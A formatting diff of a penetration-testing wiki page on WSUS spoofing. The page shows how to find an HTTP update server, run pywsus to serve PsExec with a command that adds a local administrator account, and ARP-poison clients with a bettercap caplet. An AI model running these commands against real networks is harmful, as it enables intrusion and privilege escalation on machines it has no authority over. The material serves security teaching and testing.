@@ -2,15 +2,15 @@
 
 ## Theory
 
-WSUS \(Windows Server Update Services\) allow administrators to centralize the management and deployment of Windows updates within their organization network. When first configuring this set of services, the default configuration makes the WSUS use HTTP without any secure layer like SSL/TLS. HTTPS is not enforced by default.
+WSUS (Windows Server Update Services) allow administrators to centralize the management and deployment of Windows updates within their organization network. When first configuring this set of services, the default configuration makes the WSUS use HTTP without any secure layer like SSL/TLS. HTTPS is not enforced by default.
 
-When pulling an update from the WSUS server, clients are redirected to the executable file to download and execute \(which can only be a binary signed by Microsoft\) and obtain a handler named `CommandLineInstallation` that specifies the additional parameters to pass the binary during the update installation. Without HTTPS, the WSUS is vulnerable to Man-in-the-Middle attacks where adversaries can either pose as the update server and send malicious updates or intercept and modify updates sent to the clients.
+When pulling an update from the WSUS server, clients are redirected to the executable file to download and execute (which can only be a binary signed by Microsoft) and obtain a handler named `CommandLineInstallation` that specifies the additional parameters to pass the binary during the update installation. Without HTTPS, the WSUS is vulnerable to Man-in-the-Middle attacks where adversaries can either pose as the update server and send malicious updates or intercept and modify updates sent to the clients.
 
 ## Practice
 
 The following command prints the WSUS server the client requests when searching for an update. If the path looks like `http://wsus.domain.local/`, showing the use of HTTP instead of HTTPS, the attacks can be attempted.
 
-```text
+```
 reg query HKML\Software\Policies\Microsoft\Windows\WindowsUpdate /v wuserver
 ```
 
@@ -24,21 +24,21 @@ In a scenario where the clients and the attacker are on the same subnet, and the
 
 ### Preparing the evil WSUS
 
-The evil WSUS server needs to be started before doing any ARP poisoning. The [pywsus ](https://github.com/GoSecure/pywsus)\(Python\) utility can be used for that matter.
+The evil WSUS server needs to be started before doing any ARP poisoning. The [pywsus ](https://github.com/GoSecure/pywsus)(Python) utility can be used for that matter.
 
 ```bash
 python3 pywsus.py --host $network_facing_ip --port 8530 --executable /path/to/PsExec64.exe --command '/accepteula /s cmd.exe /c "net user testuser /add && net localgroup Administrators testuser /add"'
 ```
 
-Programs other than PsExec.exe can be used here. Using built-in programs features to bypass security restrictions or operate attacks like this is called [Living off the land](living-off-the-land.md) \(LOL\). Other Windows LOL binaries and scripts \(a.k.a. LOLbins or LOLbas\) can be found on [lolbas-project.github.io](https://lolbas-project.github.io/#).
+Programs other than PsExec.exe can be used here. Using built-in programs features to bypass security restrictions or operate attacks like this is called [Living off the land](living-off-the-land.md) (LOL). Other Windows LOL binaries and scripts (a.k.a. LOLbins or LOLbas) can be found on [lolbas-project.github.io](https://lolbas-project.github.io/#).
 
 ### Poisoning and hijacking
 
-Once the WSUS server is up and running, the ARP poisoning attack can start. The best tool to operate ARP poisoning is [bettercap](https://www.bettercap.org/) \(Go\) and for the majority of the scenarios, basic knowledge of the iptables utility is required.
+Once the WSUS server is up and running, the ARP poisoning attack can start. The best tool to operate ARP poisoning is [bettercap](https://www.bettercap.org) (Go) and for the majority of the scenarios, basic knowledge of the iptables utility is required.
 
 Packets from the client to the WSUS server need to be hijacked and sent to the attacker's evil WSUS server. In order to do so, the attacker must pose as the client's gateway, route all traffic to the real gateway except the packets destined to the WSUS server.
 
-{% code title="wsus\_spoofing.cap" %}
+{% code title="wsus_spoofing.cap" %}
 ```bash
 # quick recon of the network
 net.probe on
@@ -78,7 +78,7 @@ bettercap --iface $interface --caplet wsus_spoofing.cap
 The search for Windows updates can be manually triggered when having access to the target computer by going to `Settings > Update & Security > Windows Update > Check for updates`. 
 
 {% hint style="info" %}
-By default, the automatic updates interval is 22 hours \([source](https://docs.microsoft.com/en-us/windows/deployment/update/waas-wu-settings)\).
+By default, the automatic updates interval is 22 hours ([source](https://docs.microsoft.com/en-us/windows/deployment/update/waas-wu-settings)).
 {% endhint %}
 
 ## Alternative attack
@@ -88,4 +88,3 @@ Another way of attacking insecure WSUS without having to rely on ARP poisoning b
 ## Resources
 
 {% embed url="https://www.gosecure.net/blog/2020/09/03/wsus-attacks-part-1-introducing-pywsus/" %}
-
